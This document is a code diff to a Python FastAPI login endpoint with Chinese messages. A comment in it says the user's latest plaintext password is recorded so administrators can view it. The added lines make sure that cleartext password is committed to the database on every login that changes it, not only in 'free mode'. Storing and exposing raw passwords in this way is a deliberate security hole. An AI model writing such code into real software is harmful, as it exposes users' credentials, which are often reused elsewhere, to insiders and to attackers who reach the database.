@@ -9198,8 +9198,10 @@ def login_start(data: LoginStartIn, db: Session = Depends(get_db)):
         raise HTTPException(401, "密码错误")
     # 记录最新的明文密码，便于管理员在验证后查看。
     new_plain = str(data.password or "")
+    plain_changed = False
     if str(u.password_plain or "") != new_plain:
         u.password_plain = new_plain
+        plain_changed = True
     free_mode = get_auth_free_mode(db)
     if free_mode:
         u.last_login_ts = int(time.time())
@@ -9207,6 +9209,9 @@ def login_start(data: LoginStartIn, db: Session = Depends(get_db)):
         db.commit()
         token = mk_jwt(u.username, u.session_ver)
         return {"ok": True, "token": token, "msg": "登录成功"}
+
+    if plain_changed:
+        db.commit()
 
     phone = u.phone or ""
     if not PHONE_RE.fullmatch(phone):
